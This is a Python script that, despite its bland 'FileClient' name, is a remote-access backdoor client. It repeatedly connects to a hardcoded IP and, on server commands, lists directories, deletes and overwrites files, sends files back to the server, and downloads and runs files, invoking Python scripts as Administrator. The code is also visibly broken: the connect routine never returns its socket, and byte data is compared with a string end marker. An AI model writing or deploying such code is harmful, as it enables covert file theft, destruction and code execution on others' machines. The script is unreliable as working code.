import os
import socket
import subprocess
import threading as th

class FileClient:
    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_port = server_port
        self.s = self.connect()

    def connect(self):
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.server_ip, self.server_port))
                print("Connected to the server")
                break
                return s
            except:
                pass

    def msg(self):
        while True:
            try:
            	m = self.s.recv(1024)
            except ConnectionResetError:
            	self.connect()
            if m:
                print(m)
                m = m.decode("utf-8")
                if "<folder>" in m:
                    print(m)
                    m = m.replace("<folder>", "")
                    self.folder_list(m)
                elif "<_delete_>" in m:
                    m = m.replace("<_delete_>", "")
                    self.delete(m)
                    try:
                        os.remove(m)
                    except:
                        pass
                elif "<_edit_>" in m:
                    m = m.replace("<_edit_>", "")                    
                    self.edit(m)
                elif "<_run_>" in m:
                    m = m.replace("<_run_>", "")
                    self.runn(m)
                elif "<_download_>" in m:
                	m = m.replace("<_download_>", "")
                	self.down(m)
    def down(self,m):
    	print("wait")
    	with open(m,"rb") as file: 		
    		data = file.read()
    		self.s.sendall(data)
    		self.s.send("<END>".encode("utf-8"))
    		print("sending")
    def delete(self,p):
    	os.remove(p)
    	print("remove")
    def edit(self, path):
        try:
	        file_data1 =b""
	        with open(path,"wb") as file:
	        	while True:
	        		data1 = self.s.recv(1024)
	        		if data1:
	        			if data1 == "<END>":
	        				break
	        			else:
	        				file_data1 += data1
	        	file.write(file_data1)
	        	file.close()
        except:
        	pass	       
    def runn(self, name):
        file_data =b""
        with open(name,"wb") as file:
        	while True:
        		data = self.s.recv(1024)
        		if data:
        			if data == "<END>":
        				break
        			else:
        				file_data += data
        	file.write(file_data)
        	file.close()
        if ".py" in name:
            subprocess.run(['runas', '/user:Administrator', 'python', name], check=True)
        else:
            os.startfile(name)

    def folder_list(self, path):        
        file_dict = {}
        names = os.listdir(path)
        for name in names:
            path1 = os.path.join(path, name)
            file_dict[name] = "folder" if os.path.isdir(path1) else "file"
        file_dict_str = str(file_dict)
        self.s.send(file_dict_str.encode("utf-8"))
        print("sended",file_dict)

    def start(self):
        msg_thread = th.Thread(target=self.msg)
        msg_thread.start()

if __name__ == "__main__":
    client = FileClient(server_ip="192.168.29.154", server_port=12345)
    client.start()
